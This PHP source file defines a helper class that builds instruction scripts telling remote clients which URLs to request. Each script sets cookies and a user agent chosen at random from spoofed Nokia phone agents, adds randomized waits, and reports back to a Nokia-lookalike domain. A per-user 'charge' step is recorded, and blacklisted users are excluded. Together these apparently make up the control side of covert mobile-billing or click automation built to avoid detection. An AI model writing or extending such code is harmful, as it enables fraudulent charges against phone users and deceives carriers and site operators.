<?php
abstract class Application_Service_Webflow_AbstractHelper{
    protected $dao;
    protected $result="";
    private $index=1;
    private $minDownloadCount=1;
    private $maxDownloadCount=5;
    private $minStartSleepSeconds=30;
    private $maxStartSleepSeconds=100;
    private $minProceedSleepSeconds=5;
    private $maxProceedSleepSeconds=27;
    private $agents=array(
            'NokiaN90-1/3.0545.5.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1', // N90
            'Nokia3200/1.0 (5.29) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/6.3.1.13.0', // 3200
            'NokiaN80-3/1.0552.0.7Series60/3.0Profile/MIDP-2.0Configuration/CLDC-1.1', // N80:
            'Nokia7610/2.0 (5.0509.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0', // 7610:
            'Nokia6600/1.0 (5.27.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1', // 6600:
            'Nokia6680/1.0 (4.04.07) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1', // 6680:
            'Nokia6230/2.0+(04.43)+Profile/MIDP-2.0+Configuration/CLDC-1.1+UP.Link/6.3.0.0.0', // 6230:
            'Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1', // 6630:
            'Nokia7600/2.0 (03.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', // 7600:
            'NokiaN-Gage/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0', // N-GAGE:
            'Nokia5140/2.0 (3.10) Profile/MIDP-2.0 Configuration/CLDC-1.1', // 5140:
            'Nokia3510i/1.0 (04.44) Profile/MIDP-1.0 Configuration/CLDC-1.0', // 3519i:
            'Nokia7250i/1.0 (3.22) Profile/MIDP-1.0 Configuration/CLDC-1.0', // 7250i:
            'Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0', // 7250:
            'Nokia6800/2.0 (4.17) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/5.1.2.9', // 6800:
            'Nokia3650/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0', // 3650:
            'Nokia8310/1.0 (05.11) UP.Link/6.5.0.0.06.5.0.0.06.5.0.0.06.5.0.0.0', // 8310:
            'Mozilla/5.0 (X11; U; Linux armv7l; en-GB; rv:1.9.2b6pre) Gecko/20100318 Firefox/3.5 Maemo Browser 1.7.4.7 RX-51 N900', // N900:
            'NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1', // N73:
            'Nokia6300/2.0 (04.20) Profile/MIDP-2.0 Configuration/CLDC-1.1 UNTRUSTED/1.0');
    
    /**
	 *
	 * @var Application_Model_UserModel
	 */
    protected $user;
    /**
	 *
	 * @var Application_Model_WebflowModel
	 */
    protected $webflow;
    
    /**
	 *
	 * @param Application_Model_UserModel $user        	
	 * @param Application_Model_WebflowModel $webflow        	
	 */
    public function init($user,$webflow){
        $this->user=$user;
        $this->webflow=$webflow;
        $this->dao=new Application_Dao_WebflowItemDAO();
    }
    protected function appendAgent($agent=null){
        $targetAgent=$agent;
        if($targetAgent==null){
            $targetAgent=$this->agents[rand()%count($this->agents)];
        }
        $this->append('agent:'.$targetAgent);
    }
    protected function appendResponsePage($item=null){
        $url='http://w.nqkia.com/response/webflow/?id='.$this->webflow->getId().'&uid='.$this->user->getId();
        if($item!=null) $url=$url.'&cid='.$item->getId();
        $this->appendPage($url);
    }
    protected function appendSleep($min=null,$max=null){
        $seconds=0;
        if(!$this->isWhiteUser()){
            if($min==null&&$max==null) $seconds=rand($this->minProceedSleepSeconds,$this->maxProceedSleepSeconds);
            else if($min!=null&&$max!=null) $seconds=rand($min,$max);
            else if($min!=null) $seconds=$min;
        }
        if($this->needRemoteReport()&&$this->index>2) $seconds=30; //This is for client setting, since the report need sometimes to upload the content.
        if($seconds>0) $this->append("s:$seconds");
    }
    protected function append($line){
        $this->result=$this->result.$line."\n";
    }
    protected function appendLine(){
        $line="------";
        if($this->isWhiteUser()) $line=$line.($this->index++);
        $this->append($line);
    }
    private function needRemoteReport(){
        return $this->webflow&&$this->webflow->getRemoteReport()=='Y';
    }
    private function appendReportParameters(){
        if($this->user&&$this->needRemoteReport()){
            $this->append("v105:http://w.nqkia.com/webflow/report/?uid=".$this->user->getId()."&bid=".$this->webflow->getId()."&index=".($this->index-1));
            $this->append("rc:y");
        }
    }
    
    /**
	 *
	 * @param string $url        	
	 * @param string|array $variables        	
	 * @param integer $httpMethod        	
	 * @param boolean $enableCookie        	
	 * @param boolean $enableAgent        	
	 * @param string $postParameters        	
	 * @param integer $sleepSeconds        	
	 */
    protected function appendPage($url='${v1}',$variables=null,$httpMethod=1,$postParameters=null,$enableCookie=true,$enableAgent=true,$sleepSeconds=null,$rt=null){
        $this->append('u:'.$url);
        if($postParameters!=null) $this->append("p:$postParameters");
        $this->appendSleep(($sleepSeconds!=null&&is_int($sleepSeconds))?$sleepSeconds:null);
        if($rt!=null) $this->append("rt:$rt");
        $this->append("m:$httpMethod");
        $this->append("c:".($enableCookie?'y':'n'));
        $this->append("a:".($enableAgent?'y':'n'));
        //if($this->user&&$this->user->getSoftwareVersion()==8) $this->append("v103:");
        $this->appendReportParameters();
        if($variables!=null){
            if(is_string($variables)) $this->append('v1:${'.$variables.'}');
            else if(is_array($variables)){
                $index=1;
                foreach($variables as $v){
                    if(is_string($v)){
                        $this->append("v$index".':${'.$v.'}');
                        $index++;
                    }else if(is_array($v)){
                        foreach($v as $key=>$value){
                            $this->append("v$key".':${'.$value.'}');
                        }
                    }
                }
            }
        }
        $this->appendLine();
    }
    
    /**
	 *
	 * @param Application_Model_UserModel $user        	
	 * @param Application_Model_WebflowModel $webflow        	
	 */
    protected function recordRequest(){
        $service=new Application_Service_RequestService();
        $service->recordRequest($this->user,$this->webflow);
        $service=new Application_Service_UserService();
        $service->saveUserStatistics($this->user,$this->webflow,true);
    }
    private function checkFlowPrefix($flowContent){
        $result="";
        if(strlen($flowContent)<10){
            $this->appendAgent($this->getAgent());
            $this->appendLine();
            $result=$this->result;
            $this->result="";
        }
        return $result;
    }
    private function isBlackUser(){
        return $this->user&&$this->user->isBlack();
    }
    private function isWhiteUser(){
        return $this->user&&$this->user->isWhite();
    }
    
    /**
	 *
	 * @return string
	 */
    public function process(&$flowContent,$mock=false){
        $prefix=$this->checkFlowPrefix($flowContent);
        $this->composePreChargeOutput();
        if(!$mock&&!$this->isBlackUser()){
            if($this->composeChargeOutput()!=-1) $this->recordRequest();
            $this->composePostChargeOutput();
        }
        if(strlen($this->result)>10) $flowContent=$flowContent.$prefix.$this->result;
    }
    protected function composePreChargeOutput(){}
    protected abstract function composeChargeOutput();
    protected function composePostChargeOutput(){}
    protected function getAgent(){
        return null;
    }
}

